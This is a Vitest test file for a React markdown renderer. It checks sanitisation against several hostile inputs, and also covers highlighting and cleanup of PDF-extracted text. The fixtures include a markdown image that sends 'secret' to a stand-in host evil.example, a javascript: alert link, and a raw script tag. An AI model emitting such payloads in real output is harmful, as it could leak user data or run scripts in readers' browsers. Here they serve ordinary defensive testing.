import { renderToStaticMarkup } from 'react-dom/server'
import { describe, expect, it } from 'vitest'
import MarkdownView from './MarkdownView'

const html = (md: string, highlight?: Set<string>) =>
  renderToStaticMarkup(<MarkdownView markdown={md} variant="note" highlight={highlight} />)

describe('MarkdownView safety', () => {
  it('never renders remote images (they could leak text through the URL)', () => {
    const out = html('![x](https://evil.example/?q=secret)')
    expect(out).not.toContain('<img')
    expect(out).not.toContain('evil.example')
  })

  it('blocks javascript: and data: links, and plain http', () => {
    for (const url of ['javascript:alert(1)', 'data:text/html,hi', 'http://insecure.example']) {
      expect(html(`[click](${url})`)).not.toContain('href="' + url)
    }
  })

  it('keeps https links, opening safely', () => {
    expect(html('[ok](https://example.com)')).toContain('rel="noreferrer"')
  })

  it('does not render raw HTML', () => {
    expect(html('<script>alert(1)</script> hello')).not.toContain('<script')
  })

  it('highlights a figure that is followed by a comma', () => {
    const out = renderToStaticMarkup(<MarkdownView markdown="Revenue 1,89,866, then more" variant="passage" highlight={new Set(['1,89,866'])} />)
    expect(out).toContain('<mark')
  })
})

describe('unreadable PDF text', () => {
  it('shows a marker instead of raw replacement boxes', () => {
    const out = renderToStaticMarkup(
      <MarkdownView markdown={'|Year|\n|---|\n|���� 2026|'} variant="passage" />,
    )
    expect(out).not.toContain('�')
    expect(out).toContain('▯')
  })
})

describe('broken bold from the PDF extractor', () => {
  it('does not print literal asterisks for spans like **Y **', () => {
    const out = renderToStaticMarkup(
      <MarkdownView markdown={'|a|b|\n|---|---|\n|**Y **|(unit)<br>**Y ear ended**|'} variant="passage" />,
    )
    expect(out).not.toContain('*')
    expect(out).toContain('<strong>Y</strong>')
  })
})
